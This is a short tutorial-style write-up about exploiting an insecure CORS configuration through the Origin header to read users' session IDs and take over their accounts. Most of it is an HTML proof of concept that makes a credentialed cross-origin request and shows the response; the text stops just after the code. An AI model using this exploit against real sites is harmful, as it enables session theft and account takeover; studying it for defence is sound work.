# Insecure CORS (Cross Origin Resource Sharing)


Hey there, learners so today i got a write on insure CORS which is was exploited through the header "Origin:" and i was able to steal the authenticated session id of the users and was able to login into their accounts as it had no HTTPOnly flag so it made my work easy to get cookies through JavaScript. So wont go much with theory lets just jump in :D


So i created a HTML Poc where ill be able to get the sessions id's of the victim, so the code looks like this 

## Source code

```html
<!DOCTYPE html>

<html>

<body>

<center>

<h2>CORS POC Exploit</h2>

<h3>Extract SID</h3>

<div id="demo">

<button type="button" onclick="cors()">Exploit</button>

</div>

<script>

function cors() {

var xhttp = new XMLHttpRequest();

xhttp.onreadystatechange = function() {

if (this.readyState == 4 && this.status == 200) {

document.getElementById("demo").innerHTML = alert(this.responseText);

}

};

xhttp.open("POST", "https://example.com", true);

xhttp.withCredentials = true;

xhttp.send();

}

</script>

</body>

</html>
```

that's our POC Script so 
